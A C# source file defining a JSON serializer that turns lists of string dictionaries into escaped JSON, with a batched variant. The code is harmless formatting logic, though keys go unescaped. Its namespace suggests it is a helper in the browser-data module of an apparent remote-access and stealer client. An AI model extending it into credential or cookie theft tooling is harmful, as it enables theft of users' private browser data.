﻿using System;
using System.Collections.Generic;
using System.Text;

namespace Pulsar.Client.Kematian.Browsers.Helpers.JSON
{
    public static class Serializer
    {
        public static string SerializeData(List<Dictionary<string, string>> data)
        {
            if (data == null || data.Count == 0)
                return "[]";

            StringBuilder json = new StringBuilder(data.Count * 200);
            json.Append('[');

            for (int i = 0; i < data.Count; i++)
            {
                if (i > 0)
                    json.Append(',');
                SerializeDictionary(data[i], json);
            }

            json.Append(']');
            return json.ToString();
        }

        private static void SerializeDictionary(Dictionary<string, string> dict, StringBuilder json)
        {
            json.Append('{');
            bool first = true;

            foreach (var kvp in dict)
            {
                if (!first)
                    json.Append(',');

                json.Append('"').Append(kvp.Key).Append("\":");
                AppendJsonString(kvp.Value, json);

                first = false;
            }

            json.Append('}');
        }

        private static void AppendJsonString(string value, StringBuilder sb)
        {
            if (value == null)
            {
                sb.Append("null");
                return;
            }

            sb.Append('"');

            foreach (char c in value)
            {
                switch (c)
                {
                    case '"':
                        sb.Append("\\\"");
                        break;
                    case '\\':
                        sb.Append("\\\\");
                        break;
                    case '\b':
                        sb.Append("\\b");
                        break;
                    case '\f':
                        sb.Append("\\f");
                        break;
                    case '\n':
                        sb.Append("\\n");
                        break;
                    case '\r':
                        sb.Append("\\r");
                        break;
                    case '\t':
                        sb.Append("\\t");
                        break;
                    default:
                        if (c < 32)
                        {
                            sb.Append($"\\u{(int)c:X4}");
                        }
                        else
                        {
                            sb.Append(c);
                        }
                        break;
                }
            }

            sb.Append('"');
        }

        public static string SerializeDataInBatches(List<Dictionary<string, string>> data, int batchSize = 1000)
        {
            if (data == null || data.Count == 0)
                return "[]";

            StringBuilder json = new StringBuilder(data.Count * 200);
            json.Append('[');

            for (int i = 0; i < data.Count; i += batchSize)
            {
                if (i > 0)
                    json.Append(',');

                int currentBatchSize = Math.Min(batchSize, data.Count - i);
                for (int j = 0; j < currentBatchSize; j++)
                {
                    if (j > 0)
                        json.Append(',');

                    SerializeDictionary(data[i + j], json);
                }
            }

            json.Append(']');
            return json.ToString();
        }
    }
}
